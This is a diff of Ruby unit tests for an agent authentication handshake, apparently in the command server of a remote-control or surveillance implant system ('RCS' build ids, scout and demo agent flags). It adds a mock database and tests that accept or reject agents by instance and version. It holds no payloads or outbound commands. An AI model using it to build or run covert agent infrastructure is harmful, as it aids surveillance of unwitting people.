@@ -56,28 +56,56 @@ class DB_rest
   end
 end
 
+class DB_mockup_protocol_rest
+  def initialize
+    @@failure = false
+  end
+
+  # used the change the behavior of the mockup methods
+  def self.failure=(value)
+    @@failure = value
+  end
+
+  # mockup methods
+  def login(user, pass); return (@@failure) ? false : true; end
+  def logout; end
+  def agent_status(build_id, instance_id, platform, demo, scout)
+    return {status: DB::ACTIVE_AGENT, id: 1, good: false} if instance_id == "0" * 40
+    return {status: DB::ACTIVE_AGENT, id: 1, good: true}
+  end
+end
+
 class TestProtocol < Test::Unit::TestCase
   include RCS::Crypt
 
+  ANON_VERSION = '9999123101'
+
   def setup
+    # take the internal variable representing the db layer to be used
+    # and mock it for the tests
+    DB.instance.instance_variable_set(:@db_rest, DB_mockup_protocol_rest.new)
     DB.instance.instance_variable_set(:@agent_signature, Digest::MD5.digest('test-signature'))
     DB.instance.instance_variable_set(:@factory_keys, {"RCS_9999999999" => 'test-class-key'})
+    # every test begins with the db connected
+    DB_mockup_rest.failure = false
+    DB.instance.connect!
+    assert_true DB.instance.connected?
   end
 
   def test_invalid_auth
     # too short
-    content = Protocol.authenticate('test-peer', 'test-uri', "ciao" * 16)
+    content = Protocol.authenticate('test-peer', 'test-uri', "ciao" * 16, ANON_VERSION)
     assert_nil content
 
     # random junk
     auth_content = SecureRandom.random_bytes(112)
-    content = Protocol.authenticate('test-peer', 'test-uri', auth_content)
+    content = Protocol.authenticate('test-peer', 'test-uri', auth_content, ANON_VERSION)
     assert_nil content
 
     # fake message inside the crypt
     message = "test fake message to fuzzy the protocol".ljust(104, "\x00")
     message = aes_encrypt(message, DB.instance.agent_signature)
-    content, type, cookie = Protocol.authenticate('test-peer', 'test-uri', message)
+    content, type, cookie = Protocol.authenticate('test-peer', 'test-uri', message, ANON_VERSION)
     assert_nil content
   end
 
@@ -92,7 +120,7 @@ class TestProtocol < Test::Unit::TestCase
     message = kd + nonce + build + instance + type + sha
     message = aes_encrypt(message, DB.instance.agent_signature)
 
-    content, type, cookie = Protocol.authenticate('test-peer', 'test-uri', message)
+    content, type, cookie = Protocol.authenticate('test-peer', 'test-uri', message, ANON_VERSION)
 
     assert_equal "application/octet-stream", type
     assert_kind_of String, cookie
@@ -124,7 +152,7 @@ class TestProtocol < Test::Unit::TestCase
     message += SecureRandom.random_bytes(rand(128..1024))
     message = Base64.strict_encode64(message)
 
-    content, type, cookie = Protocol.authenticate('test-peer', 'test-uri', message)
+    content, type, cookie = Protocol.authenticate('test-peer', 'test-uri', message, ANON_VERSION)
 
     assert_equal "application/octet-stream", type
     assert_kind_of String, cookie
@@ -145,6 +173,74 @@ class TestProtocol < Test::Unit::TestCase
 
     check = content.slice!(0..19)
     assert_equal check, Digest::SHA1.digest(k + ks)
+
+    assert_true Protocol.valid_authentication('test-peer', cookie)
+  end
+
+  def test_auth_with_agent_not_good_anon_good
+    # Crypt_C ( Kd, NonceDevice, BuildId, InstanceId, Platform, sha1 ( BuildId, InstanceId, SubType, Cb ) )
+    kd = "\x01" * 16
+    nonce = "\x02" * 16
+    build = "RCS_9999999999".ljust(16, "\x00")
+    # this instance is not good
+    instance = "\x00" * 20
+    type = "TEST".ljust(16, "\x00")
+    sha = Digest::SHA1.digest(build + instance + type + DB.instance.factory_key_of('RCS_9999999999'))
+    message = kd + nonce + build + instance + type + sha
+    message = aes_encrypt(message, DB.instance.agent_signature)
+
+    content, type, cookie = Protocol.authenticate('test-peer', 'test-uri', message, ANON_VERSION)
+
+    assert_equal nil, type
+    assert_equal nil, content
+    assert_equal nil, cookie
+  end
+
+  def test_auth_with_agent_good_anon_not_good
+    # Crypt_C ( Kd, NonceDevice, BuildId, InstanceId, Platform, sha1 ( BuildId, InstanceId, SubType, Cb ) )
+    kd = "\x01" * 16
+    nonce = "\x02" * 16
+    build = "RCS_9999999999".ljust(16, "\x00")
+    instance = "\x03" * 20
+    type = "TEST".ljust(16, "\x00")
+    sha = Digest::SHA1.digest(build + instance + type + DB.instance.factory_key_of('RCS_9999999999'))
+    message = kd + nonce + build + instance + type + sha
+    message = aes_encrypt(message, DB.instance.agent_signature)
+
+    content, type, cookie = Protocol.authenticate('test-peer', 'test-uri', message, "2000010101")
+
+    assert_equal nil, type
+    assert_equal nil, content
+    assert_equal nil, cookie
+  end
+
+  def test_auth_with_agent_not_good_anon_not_good
+    # Crypt_C ( Kd, NonceDevice, BuildId, InstanceId, Platform, sha1 ( BuildId, InstanceId, SubType, Cb ) )
+    kd = "\x01" * 16
+    nonce = "\x02" * 16
+    build = "RCS_9999999999".ljust(16, "\x00")
+    # not good instance
+    instance = "\x00" * 20
+    type = "TEST".ljust(16, "\x00")
+    sha = Digest::SHA1.digest(build + instance + type + DB.instance.factory_key_of('RCS_9999999999'))
+    message = kd + nonce + build + instance + type + sha
+    message = aes_encrypt(message, DB.instance.agent_signature)
+
+    content, type, cookie = Protocol.authenticate('test-peer', 'test-uri', message, "2000010101")
+
+    assert_equal "application/octet-stream", type
+    assert_kind_of String, cookie
+
+    # [ Crypt_C ( Ks ), Crypt_K ( NonceDevice, Response ) ]
+    assert_equal 64, content.length
+    ks = aes_decrypt(content.slice!(0..31), DB.instance.agent_signature)
+    # calculate the session key ->  K = sha1(Cb || Ks || Kd)
+    # we use a schema like PBKDF1
+    k = Digest::SHA1.digest(DB.instance.factory_key_of('RCS_9999999999') + ks + kd)
+    snonce = aes_decrypt(content, k)
+
+    # check if the nonce is equal in the response
+    assert_equal nonce, snonce.slice(0..15)
 
     assert_true Protocol.valid_authentication('test-peer', cookie)
   end
